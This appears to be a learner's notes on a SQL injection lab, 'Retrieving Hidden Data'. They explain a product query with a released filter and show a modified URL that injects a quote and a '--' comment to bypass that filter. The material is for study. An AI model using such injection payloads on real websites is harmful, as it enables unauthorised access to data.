---
title: 'Lab 1: Retrieving Hidden Data'
updated: 2022-12-01T09:52:55.0000000+04:00
created: 2022-11-29T09:38:51.0000000+04:00
---

Lab 1: Retrieving Hidden Data
Tuesday, November 29, 2022
9:38 AM
Let's say the webpage URL is as followed:

**<u>Original Request to the database below:</u>**

<https://insecure-website.com/products?category=Gifts>

The SQL query returned to the database for this URL can be broken down into:

SELECT \* FROM products WHERE category = 'Gifts' AND released = 1

1.  all details (\*)
2.  from the products table
3.  where the category is Gifts
4.  and released is 1.
5.  **Released = 1**: typically used to hide products that are not released
6.  **Released = 0**: typically used to unhide products that are not released

-----------------------------------------------------------------------------------------------------------------------------------

**<u>Modified Request to the Database:</u>**

<https://insecure-website.com/products?category=Gifts'>--

Query to the database

SELECT \* FROM products WHERE category = 'Gifts'--' AND released = 1

1.  -- is a comment sequence, indicating anything after it will be interpreted as a comment.
- This will hence remove the remaining query, especially the AND released = 1

